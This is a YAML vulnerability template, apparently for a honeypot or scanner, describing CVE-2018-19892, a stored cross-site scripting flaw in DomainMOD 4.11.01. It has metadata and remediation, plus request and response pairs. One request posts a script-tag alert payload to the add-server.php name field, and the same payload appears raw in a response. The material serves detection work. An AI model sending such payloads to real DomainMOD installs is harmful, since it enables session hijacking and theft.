id: CVE-2018-19892
info:
  name: DomainMOD 4.11.01 - Cross-Site Scripting
  author: arafatansari
  description: 'DomainMOD 4.11.01 contains a cross-site scripting vulnerability via
    /domain//admin/dw/add-server.php DisplayName parameters.

    '
  severity: medium
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary JavaScript code in the context of the victim''s browser, leading
    to potential session hijacking, defacement, or theft of sensitive information.

    '
  remediation: 'Upgrade to the latest version of DomainMOD or apply the vendor-provided
    patch to mitigate this vulnerability.

    '
  reference:
  - https://www.exploit-db.com/exploits/45959
  - https://github.com/domainmod/domainmod/issues/85
  - https://nvd.nist.gov/vuln/detail/CVE-2018-19892
  - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 4.8
    cve-id: CVE-2018-19892
    cwe-id: CWE-79
    epss-score: 0.00101
    epss-percentile: 0.40415
    cpe: cpe:2.3:a:domainmod:domainmod:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 3
    vendor: domainmod
    product: domainmod
  tags: cve2018,cve,domainmod,xss,authenticated,edb
traps:
- request:
    method: POST
    path: /
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'new_username={{username}}&new_password={{password}}

      '
  response:
    status_code: 200
    headers: {}
    body: '"><script>alert(document.domain)</script></a>'
- request:
    method: POST
    path: /admin/dw/add-server.php
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'new_name=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&new_host=abc&new_protocol=https&new_port=2086&new_username=abc&new_api_token=255&new_hash=&new_notes=

      '
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /admin/dw/servers.php
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
